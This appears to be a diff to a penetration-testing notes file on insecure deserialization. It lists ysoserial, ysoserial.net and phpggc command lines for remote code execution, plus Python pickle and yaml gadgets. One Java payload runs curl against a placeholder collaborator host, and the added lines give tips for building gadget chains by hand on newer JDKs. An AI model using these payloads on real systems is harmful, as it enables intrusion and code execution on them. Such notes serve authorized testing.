@@ -43,6 +43,11 @@ java -jar ysoserial.jar URLDNS "http://probe.<collab>" | base64 -w0     # OOB pr
 java -jar ysoserial.jar CommonsCollections6 "curl http://<collab>/x" | base64 -w0   # after sink confirmed
 # .NET ViewState: known machineKey -> ysoserial.net -p ViewState
 ```
+**No ysoserial jar on the box?** (the tooling VM often lacks it; the jitpack build download returns an
+empty/9-byte stub.) BUILD the gadget yourself against the target's gadget lib from Maven Central, then
+compile with `--release <target-JRE-major>` and run with the right `--add-opens`. Full recipe +
+modern-JDK (17/21) gotchas (class-version mismatch, `InaccessibleObjectException`, CC5's String-typed
+`BadAttributeValueExpException.val` on JDK 21 -> use CC6) in [[deserialization]] "Build the gadget yourself".
 3. **.NET:** `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd"`; ViewState via `ysoserial.net -p ViewState --generator=... --validationkey=...`.
 4. **PHP:** craft POP chain from app's `__wakeup`/`__destruct`/`__toString`; `phpggc Framework/RCE1 system id`. Look for `unserialize()` on user input, phar:// (deser via filesystem funcs).
 5. **Python:** `pickle.loads` on user data -> `__reduce__` returning `(os.system, ("cmd",))`. yaml.load (unsafe) -> `!!python/object/apply:os.system`.
